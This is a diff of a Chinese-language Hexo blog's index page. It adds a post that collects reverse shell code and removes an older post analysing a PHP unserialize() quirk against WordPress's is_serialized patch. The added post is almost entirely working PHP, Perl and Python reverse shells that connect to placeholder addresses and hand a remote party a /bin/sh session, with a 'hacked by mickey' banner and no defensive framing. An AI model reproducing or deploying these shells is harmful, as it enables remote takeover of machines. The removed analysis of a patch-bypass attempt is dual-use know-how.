@@ -228,6 +228,200 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/09/26/记录一些反弹shell代码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2014/09/26/记录一些反弹shell代码/" itemprop="url">记录一些反弹shell代码</a></h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2014-09-26T09:48:06+08:00">
+                2014-09-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>php:</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">$protocol=getprotobyname(’tcp’);
+$Sock=socket_create(AF_INET,SOCK_STREAM,$protocol);
+$ret=socket_connect($Sock,gethostbyname(’127.0.0.1’),’11011’);
+$message="------PhpShell hacked by mickey---------
+mickey@pentest:";
+socket_write($Sock,$message,strlen($message));
+while($cmd=socket_read($Sock,65535,$protocol)){
+    if(trim(strtolower($cmd))=="exit"){
+    socket_write($Sock,"Bye Bye,hacked by mickey
+");
+    exit;
+    }else{
+        $process = proc_open($cmd, array(0=&gt;array("pipe","r"),1=&gt;array("pipe","w"),2=&gt;array("pipe","w"),),$pipes,str_replace(’\’,’/’,dirname(__FILE__)),array(’PATH’=&gt;’/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin’));
+        if(is_resource($process)){
+            fwrite($pipes[0], $cmd);
+            fclose($pipes[0]);
+            $msg=stream_get_contents($pipes[1]);
+            socket_write($Sock,$msg,strlen($msg));
+            fclose($pipes[1]);
+            $msg=stream_get_contents($pipes[2]);
+            socket_write($Sock,$msg,strlen($msg));
+            $return_value = proc_close($process);
+    }
+        socket_write($Sock,’mickey@pentest:’,strlen(’mickey@pentest:’));
+    }
+}</pre>
+
+<p>&nbsp;</p>
+<p>perl:</p>
+<pre class="brush:perl; toolbar: true; auto-links: true;">use strict;   
+use Socket;    
+use IO::Handle;   
+my $pack_addr = sockaddr_in(8080, inet_aton("127.0.0.1"));
+socket(S,AF_INET,SOCK_STREAM,0);
+STDOUT-&gt;autoflush(1);
+S-&gt;autoflush(1);
+connect(S,$pack_addr);
+open STDIN, "&lt;&amp;S";
+open STDOUT, "&gt;&amp;S";
+open STDERR, "&gt;&amp;S";
+system("/bin/sh -i");    
+close S;
+exit 0;</pre>
+
+<p>&nbsp;</p>
+<p>python:</p>
+<pre class="brush:python; toolbar: true; auto-links: true;">import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("10.0.0.1",1234));
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2);
+p=subprocess.call(["/bin/sh","-i"]);</pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2014/08/21/关于Jenkins安全测试的一些技巧/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1682,264 +1876,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2013/09/14/php反序列unserialize的一个小特性/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2013/09/14/php反序列unserialize的一个小特性/" itemprop="url">php反序列unserialize的一个小特性</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Veröffentlicht am</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2013-09-14T18:42:59+08:00">
-                2013-09-14
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">in</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PHP-MYSQL学习/" itemprop="url" rel="index">
-                    <span itemprop="name">PHP|MYSQL学习</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">&nbsp; &nbsp; &nbsp; 这几天wordpress的那个反序列漏洞比较火，具体漏洞我就不做分析了，看这篇：<a href="http://drops.wooyun.org/papers/596，" target="_blank" rel="noopener">http://drops.wooyun.org/papers/596，</a>&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">你也可以去看英文的原文：<a href="http://vagosec.org/2013/09/wordpress-php-object-injection/。" target="_blank" rel="noopener">http://vagosec.org/2013/09/wordpress-php-object-injection/。</a>&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">wp官网打了补丁，我试图去bypass补丁，但让我自以为成功的时候，发现我天真了，并没有成功绕过wp的补丁，但却发现了unserialize的一个小特性，在此和大家分享一下。&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">1.unserialize()函数相关源码：&nbsp;</span></p>
-<p>`if ((YYLIMIT - YYCURSOR) &lt; 7) YYFILL(7);&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &#42YYCURSOR;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch (yych) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’C’:&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’O’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy13;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’N’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy5;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’R’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy2;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’S’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy10;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’a’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy11;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’b’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy6;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’d’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy8;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’i’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy7;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’o’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy12;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’r’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy4;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’s’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy9;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’}’:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy14;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy16;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">上边这段代码是判断序列串的处理方式，如序列串O:4:”test”:1:{s:1:”a”;s:3:”aaa”;},处理这个序列串，先获取字符串第一个字符为O，然后case ’O’:&nbsp;&nbsp;goto yy13&nbsp;</span></p>
-<p>`yy13:&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42(YYMARKER = ++YYCURSOR);&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yych == ’:’) goto yy17;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy3;`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">从上边代码看出，指针移动一位指向第二个字符，判断字符是否为:，然后 goto yy17&nbsp;</span></p>
-<p>`yy17:&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42++YYCURSOR;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yybm[0+yych] &amp; 128) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy20;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yych == ’+’) goto yy19;&nbsp;</p>
-<p>…….&nbsp;</p>
-<p>yy19:&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yych = &amp;#42++YYCURSOR;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (yybm[0+yych] &amp; 128) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy20;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto yy18;`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">从上边代码看出，指针移动，判断下一位字符，如果字符是数字直接goto yy20，如果是’+’就goto yy19，而yy19中是对下一位字符判断，如果下一位字符是数字goto yy20，不是就goto yy18，yy18是直接退出序列处理，yy20是对object性的序列的处理，所以从上边可以看出：&nbsp;</span></p>
-<p>`O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}&nbsp;</p>
-<p>O:4:”test”:1:{s:1:”a”;s:3:”aaa”;}`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">都能够被unserialize反序列化，且结果相同。&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">2.实际测试：&nbsp;</span></p>
-<p>`&lt;?php&nbsp;</p>
-<p>var_dump(unserialize(’O:+4:”test”:1:{s:1:”a”;s:3:”aaa”;}’));&nbsp;</p>
-<p>var_dump(unserialize(’O:4:”test”:1:{s:1:”a”;s:3:”aaa”;}’));&nbsp;</p>
-<p>?&gt;`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">输出：&nbsp;</span></p>
-<p>`object(<strong>PHP_Incomplete_Class)#1 (2) { [“</strong>PHP_Incomplete_Class_Name”]=&gt; string(4) “test” [“a”]=&gt; string(3) “aaa” }&nbsp;</p>
-<p>object(<strong>PHP_Incomplete_Class)#1 (2) { [“</strong>PHP_Incomplete_Class_Name”]=&gt; string(4) “test” [“a”]=&gt; string(3) “aaa” }`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">其实，不光object类型处理可以多一个’+’,其他类型也可以，具体测试不做过多描述。&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">3.我们看下wp的补丁：&nbsp;</span></p>
-<p>`function is_serialized( $data, $strict = true ) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// if it isn’t a string, it isn’t serialized&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ! is_string( $data ) )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$data = trim( $data );&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ( ’N;’ == $data )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return true;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$length = strlen( $data );&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $length &lt; 4 )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’:’ !== $data[1] )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $strict ) {//output&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$lastc = $data[ $length - 1 ];&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’;’ !== $lastc &amp;&amp; ’}’ !== $lastc )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {//input&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$semicolon = strpos( $data, ’;’ );&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$brace&nbsp;&nbsp;&nbsp;&nbsp; = strpos( $data, ’}’ );&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// Either ; or } must exist.&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false === $semicolon &amp;&amp; false === $brace )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// But neither must be in the first X characters.&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false !== $semicolon &amp;&amp; $semicolon &lt; 3 )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( false !== $brace &amp;&amp; $brace &lt; 4 )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$token = $data[0];&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch ( $token ) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’s’ :&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( $strict ) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if ( ’”’ !== $data[ $length - 2 ] )&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} elseif ( false === strpos( $data, ’”’ ) ) {&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’a’ :&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’O’ :&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo “a”;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (bool) preg_match( “/^{$token}:[0-9]+:/s”, $data );&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’b’ :&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’i’ :&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case ’d’ :&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$end = $strict ? ’$’ : ’’;&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return (bool) preg_match( “/^{$token}:[0-9.E-]+;$end/“, $data );&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;&nbsp;</p>
-<p>}`</p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">补丁中的&nbsp;</span></p>
-<p><code>return (bool) preg_match( &quot;/^{$token}:[0-9]+:/s&quot;, $data );</code></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">可以多一个’+’来绕过，虽然我们通过这个方法把序列值写入了数据库，但从数据库中提取数据，再次验证的时候却没法绕过了，我这个加号没能使数据进出数据库发生任何变化，我个人认为这个补丁绕过重点在于数据进出数据的前后变化。&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">4.总结&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">虽然没有绕过wp补丁，但这个unserialize()的小特性可能会被很多开发人员忽略，导致程序出现安全缺陷。&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">以上的分析有什么错误请留言指出。&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">5.参考&nbsp;</span></p>
-<p><span style="font-family:Verdana, ’Microsoft YaHei’, Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;">《WordPress &lt; 3.6.1 PHP Object Injection》&nbsp;</span></p>
